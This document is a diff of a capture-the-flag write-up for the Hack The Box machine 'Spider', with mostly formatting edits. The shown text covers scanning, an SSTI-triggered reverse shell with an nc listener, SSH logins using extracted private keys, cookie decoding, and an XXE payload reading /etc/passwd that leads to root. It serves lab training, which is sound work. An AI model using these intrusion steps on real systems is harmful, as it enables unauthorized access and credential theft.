@@ -9,13 +9,15 @@
  *TCP over SSH
   *HTTP Default page
   *Host 7.6p1 Ubuntu 4ubuntu0.3
+  
 #### code-Nmap
 ```bash
 nmap -sC -sV  -A -oN nmap.txt  10.10.10.243 
 ```
+
+#### output
  
- #### output
-  ![[nmap.png]] 
+  ![[spider/static png/nmap.png]] 
 
  
  ```bash
@@ -34,9 +36,8 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://spider.htb/
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
 ```
-c
 
-## Default Page
+## Default Page-AMAD
 lets check the default page  but first we need to add the hostname to ``/etc/hosts ``file and browse the page.
 #### code-/etc/hosts
 ```bash
@@ -50,6 +51,7 @@ While i was checking at the templetes , I found a username 	``chiv``
 ![[chiv.png]]
 
 Then i decided to look for  directories which are avaliable  in the site by doing ``gobuster``  to enumerate the directories
+
 #### code -gobuster
 ```bash
 gobuster dir -u  http://spider.htb  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -k -o gobusters
@@ -410,7 +412,8 @@ But the payload seem to have bad characters in it like the ``'`` and ``{{}}`` so
  ![[payl.png]]
  
  Then we open an nc listener  on port 9001
- #### code-Listening
+ 
+#### code-Listening
  ```bash
  nc -lnvp 9001
  ```
@@ -418,10 +421,10 @@ But the payload seem to have bad characters in it like the ``'`` and ``{{}}`` so
  After posting a support ticket with the above ``SSTI payload `` to the contact a ``reverse shell ``is sent back to our listener which was Listening on port 9001
  
  ![[shell.png]]
- 
- ## Takeover
+
+## Takeover
  After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
- #### code-stty
+#### code-stty
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  [ctrl] + z
@@ -473,41 +476,41 @@ IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
 
  
  we copy the key then we have to execute ``chmod`` on the key to make it detected:
- #### code-chmod on key
+#### code-chmod on key
  ```bash
  chmod 600 chiv.key
  ```
  
  Then we use the ``chiv key`` to have an interactive shell after ssh alongside chiv
- #### code-ssh@chiv
+#### code-ssh@chiv
  ```bash
  ssh -i chiv.key chiv@spider.htb
  ```
  
  ![[sshlog.png]]
  
- ## Privilege Escalation
-The output of the ``ps aux`` command shows a ``uwsgi p``rocess running as ``root ``:
- 
- Looking at``listening ports``, we discover a local webserver on ``port 8080``:
- #### code- listenig port
+## Privilege Escalation
+The output of the ``ps aux`` command shows a ``uwsgi `` process running as ``root ``  Looking at``listening ports``, we discover a local webserver on ``port 8080``:
+
+#### code- listenig port
  ```bash
  ss -lntp
  ```
  
  ![[forwadingport.png]]
  
- Then we forward our ``local port 800 ``to ``port 8080 ``on the remote target using ``ssh``  by typing this which will give you the ssh inside ``chiv``
- #### code- get ssh to forward the webserver
+ Then we forward our ``local port 8000 ``to ``port 8080 ``on the remote target using ``ssh``  by typing this which will give you the ssh inside ``chiv``
+#### code- get ssh to forward the webserver
  ```bash
- ~C
+ ~ shift C
  ```
  
- #### code-forwarding port
+#### code-forwarding port
  ```bash
  -L 8000:127.0.0.1:8080
  ```
- 
+
+## Default Page- BETA
  We can now access the  ``web server`` by browsing to http://localhost/8000. A login form is shown:
  
  ![[betalog.png]]
@@ -525,7 +528,7 @@ The output of the ``ps aux`` command shows a ``uwsgi p``rocess running as ``root
  ![[burpbetainter.png]]
  
  We perform a new  ``login ``and retrieve our ``session cookie`` so that we can use ``flask_unsign ``to decode the cookie
- #### code-flask --decode cookie
+#### code-flask --decode cookie
  ```bash
  flask-unsign --decode --cookie'.eJxFjUFvgyAYhv_KwnkHtPEwj51gQwMGkQ_lpqMJVrCmNWm7pv99W7Jl5_d5nveBwi0GlD_Qy4BypImgjtwaOTGozTpDTMzB8Puws2OvWQUF7VVgIPSieOlBaX51dDsPn_44NCG1RGKFQyGNY_XOnw141f_sqWMS01lpsbU4kENBjzzYrItJ6eiiBYCB1u814Rn__oM5jIO22IT_3p9flbRrorWQMNzBB97jhLiN9YZk0YBTrqSteF-LXv_y5HrX0U811meZLhsXxVq1dqoL-Yaer2g5jfN6QTl-fgGY41gu.YXnpXA.cKSG93T7Qs89GMbkBx5DLKeEgn4'
  ```
@@ -538,7 +541,7 @@ The output of the ``ps aux`` command shows a ``uwsgi p``rocess running as ``root
  ![[decodecookie.png]]
  
  We then decode the ``lxml``  
- #### code decoding lxml
+#### code decoding lxml
  ```bash
  echo -n PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bGVzbGV5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4= | base64 -d
  ```
@@ -567,9 +570,10 @@ The output of the ``ps aux`` command shows a ``uwsgi p``rocess running as ``root
 </root>   
  ```
  
- ### Privilege escalation payload-Research,Trial and Defination
+  
+### Privilege escalation payload-Research,Trial and Defination
  This may allow us to perform`` XXE injection ``by appending a DTD element after the initial comment. 
- #### code-payload test
+#### code-payload test
  ```bash
  <!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///etc/passwd'>]><!--
  ````
@@ -640,18 +644,21 @@ vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j
 
 
 After copying the key to our machine we can use it to ssh to the system as root :
- #### code-chmod on root key
+#### code-chmod on root key
  ```bash
  chmod 600 root.key
  ```
  
  Then we use the ``root key`` to have an interactive shell after ssh alongside root
- #### code-ssh@chiv
+
+#### code-ssh@chiv
  ```bash
  ssh -i root.key root@spider.htb
  ```
  
  ![[fanally.png]]
+
+Successfully obtained the flag file with root privileges
  
     -------------------------END successful attack @leshack98----------------------
  
